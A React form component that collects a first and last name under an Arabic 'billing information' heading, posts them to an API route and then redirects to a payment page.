import React from "react";
import { useState } from "react";
import axios from "axios";
import { api_route } from "../App";
import { TailSpin } from "react-loader-spinner";
const Data = () => {
  const [firstName, setFirstName] = useState(null);
  const [lastName, setLastName] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    try {
      await axios
        .post(api_route + "/data/" + sessionStorage.getItem("id"), {
          firstName,
          lastName,
        })
        .then(() => (window.location.href = "/payment"));
    } catch (error) {}
  };
  return (
    <>
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
      <div className="flex flex-col w-full items-center justify-start bg-white flex-1 py-10">
        <img src="/logo.jpg" className="w-24 mb-10" />
        <div className="flex flex-col  items-center md:w-1/2   w-full px-2">
          <span className="w-full border-b-2 pb-2 text-[#1c6345] font-bold">
            معلومات الفوترة
          </span>
          <span
            className="w-full text-right py-2 text-sm text-[#1c6345]  font-bold"
            dir="rtl"
          >
            حقل مطلوب *
          </span>
          <form
            className="w-full flex flex-col items-center   w gap-y-4"
            onSubmit={handleSubmit}
          >
            <div className="w-full flex flex-col gap-y-2">
              <label className="text-[#278a61]  font-bold">
                الأسم الأول *{" "}
              </label>
              <input
                type="text"
                required
                className="w-full rounded border-2 py-1"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
              />
            </div>
            <div className="w-full flex flex-col gap-y-2">
              <label className="text-[#278a61]  font-bold">
                الأسم الأخير *{" "}
              </label>
              <input
                type="text"
                required
                className="w-full rounded border-2 py-1 outline-[#278a61]"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
              />
            </div>

            <button className="bg-[#278a61] text-white px-10 w-fit py-3 rounded-md">
              متابعة
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default Data;
